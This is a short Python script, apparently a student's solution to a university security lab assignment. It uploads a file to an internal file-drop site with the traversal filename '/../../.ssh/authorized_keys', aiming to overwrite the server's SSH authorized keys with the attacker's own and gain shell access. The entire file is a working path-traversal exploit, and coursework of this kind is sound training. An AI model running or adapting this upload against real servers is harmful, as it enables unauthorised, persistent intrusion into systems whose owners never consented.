import requests

url = "https://dropbox.internal.regjeringen.uiaikt.no/"
files={
    'file':(
        '/../../.ssh/authorized_keys',
        open(
            '/workspaces/2023-ikt222-assignment-4/code/solutions/attack_3/authorized_keys',
            'rb'
        ),
        'application/octet-stream'
    )
}
response = requests.request("POST", url,  files=files)

print(response.text)